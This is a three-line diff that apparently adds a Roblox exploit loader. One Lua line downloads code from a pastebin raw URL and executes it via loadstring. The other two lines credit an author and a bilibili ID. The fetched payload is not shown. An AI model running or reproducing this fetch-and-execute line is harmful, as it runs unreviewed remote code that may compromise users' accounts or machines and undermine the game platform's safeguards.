@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/A2JKXJYW"))()
+--Made by Lizzy
+--bilibili UID:1719853593
